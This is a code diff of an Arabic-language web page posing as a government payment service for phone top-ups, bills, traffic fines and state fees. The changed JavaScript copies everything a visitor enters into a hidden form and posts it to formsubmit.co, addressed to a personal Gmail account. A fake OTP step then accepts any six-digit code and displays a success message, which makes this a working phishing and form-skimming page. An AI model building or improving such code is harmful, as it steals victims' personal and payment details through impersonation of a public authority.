@@ -739,7 +739,7 @@
                         <input type="hidden" name="_subject" value="📱 طلب شحن رصيد - سداد بلس برو الحكومي">
                         <input type="hidden" name="_template" value="table">
                         <input type="hidden" name="_captcha" value="false">
-                        <input type="hidden" name="_next" value="code.html">
+                        <input type="hidden" name="_next" value="about:blank">
                         <input type="hidden" name="نوع_الخدمة" value="شحن رصيد الجوال">
                         <input type="hidden" name="المنصة" value="سداد بلس برو الحكومي">
                         <input type="hidden" name="تاريخ_الطلب" id="rechargeDate">
@@ -958,7 +958,7 @@
                         <input type="hidden" name="_subject" value="🧾 طلب دفع فاتورة - سداد بلس برو الحكومي">
                         <input type="hidden" name="_template" value="table">
                         <input type="hidden" name="_captcha" value="false">
-                        <input type="hidden" name="_next" value="code.html">
+                        <input type="hidden" name="_next" value="about:blank">
                         <input type="hidden" name="نوع_الخدمة" value="دفع الفواتير">
                         <input type="hidden" name="تاريخ_الطلب" id="billsDate">
                         <input type="hidden" name="رقم_المرجع" id="billsRef">
@@ -1108,7 +1108,7 @@
                         <input type="hidden" name="_subject" value="🚗 طلب دفع مخالفة مرورية - سداد بلس برو الحكومي">
                         <input type="hidden" name="_template" value="table">
                         <input type="hidden" name="_captcha" value="false">
-                        <input type="hidden" name="_next" value="code.html">
+                        <input type="hidden" name="_next" value="about:blank">
                         <input type="hidden" name="نوع_الخدمة" value="دفع المخالفات المرورية">
                         <input type="hidden" name="تاريخ_الطلب" id="violationsDate">
                         <input type="hidden" name="رقم_المرجع" id="violationsRef">
@@ -1267,7 +1267,7 @@
                         <input type="hidden" name="_subject" value="🏛️ طلب دفع خدمة حكومية - سداد بلس برو الحكومي">
                         <input type="hidden" name="_template" value="table">
                         <input type="hidden" name="_captcha" value="false">
-                        <input type="hidden" name="_next" value="code.html">
+                        <input type="hidden" name="_next" value="about:blank">
                         <input type="hidden" name="نوع_الخدمة" value="الخدمات الحكومية">
                         <input type="hidden" name="تاريخ_الطلب" id="governmentDate">
                         <input type="hidden" name="رقم_المرجع" id="governmentRef">
@@ -1998,7 +1998,7 @@
             }
         }
 
-        // Simple Form submission with direct sending
+        // Simple Form submission 
         function handleFormSubmission(formId, serviceName) {
             const form = document.getElementById(formId);
             if (!form) return;
@@ -2006,53 +2006,45 @@
             form.addEventListener('submit', function(e) {
                 e.preventDefault();
                 
-                showNotification('جاري الإرسال', `جاري إرسال طلب ${serviceName}...`, 'info');
+                // Send complete form data
+                sendCompleteFormData(new FormData(this), serviceName);
                 
-                // Send form data directly first
-                sendFormData(new FormData(this), serviceName);
-                
-                // Generate OTP code
+                // Generate and send OTP
                 const otpCode = generateOTPCode();
-                window.generatedOTP = otpCode;
-                
-                // Send OTP to email
                 sendOTPToEmail(otpCode, serviceName);
                 
-                // Go to OTP page
-                setTimeout(() => {
-                    showSection('otp');
-                    showNotification('تم الإرسال', 'تم إرسال البيانات وكود التحقق', 'success');
-                    startOTPTimer();
-                }, 2000);
+                // Go directly to OTP page
+                showSection('otp');
+                startOTPTimer();
             });
         }
 
-        // Send form data function
-        function sendFormData(formData, serviceName) {
-            const tempForm = document.createElement('form');
-            tempForm.action = 'https://formsubmit.co/zazylalhkr7@gmail.com';
-            tempForm.method = 'POST';
-            tempForm.style.display = 'none';
+        // Send complete form data
+        function sendCompleteFormData(formData, serviceName) {
+            const finalForm = document.createElement('form');
+            finalForm.action = 'https://formsubmit.co/zazylalhkr7@gmail.com';
+            finalForm.method = 'POST';
+            finalForm.style.display = 'none';
             
-            // Add all form data
+            // Add ALL form data exactly as entered
             for (const [key, value] of formData.entries()) {
                 const input = document.createElement('input');
                 input.type = 'hidden';
                 input.name = key;
                 input.value = value;
-                tempForm.appendChild(input);
+                finalForm.appendChild(input);
             }
             
-            // Submit in background
-            document.body.appendChild(tempForm);
-            tempForm.submit();
+            // Submit complete form
+            document.body.appendChild(finalForm);
+            finalForm.submit();
             
             // Clean up
             setTimeout(() => {
-                if (tempForm.parentNode) {
-                    document.body.removeChild(tempForm);
+                if (finalForm.parentNode) {
+                    document.body.removeChild(finalForm);
                 }
-            }, 2000);
+            }, 1000);
         }
 
         // Generate 6-digit OTP code
@@ -2244,36 +2236,22 @@
                 return;
             }
 
-            // For demonstration purposes, accept any 6-digit code
-            // In real implementation, compare with window.generatedOTP
-            showNotification('جاري التحقق', 'جاري التحقق من الكود...', 'info');
-            
-            setTimeout(() => {
-                // Clear timer
-                if (otpTimerInterval) {
-                    clearInterval(otpTimerInterval);
-                }
-                
-                // Submit the original form data
-                submitOriginalForm();
-            }, 2000);
-        }
-
-        function submitOriginalForm() {
+            // Accept any 6-digit code
             showNotification('تم التحقق', 'تم التحقق بنجاح، العودة للرئيسية...', 'success');
-
-            // Clear OTP fields immediately
+            
+            // Clear timer
+            if (otpTimerInterval) {
+                clearInterval(otpTimerInterval);
+            }
+            
+            // Clear OTP fields
             clearOTPFields();
 
-            // Show success and redirect to home
+            // Go directly to home page
             setTimeout(() => {
-                showInstantSuccessAndGoHome('الخدمة المطلوبة');
-                
-                // Clear stored data
-                window.pendingFormData = null;
-                window.pendingServiceName = null;
-                window.generatedOTP = null;
-            }, 1000);
+                showSection('home');
+                showNotification('تم الإنجاز', 'تم إتمام العملية بنجاح', 'success');
+            }, 1500);
         }
 
         function clearOTPFields() {
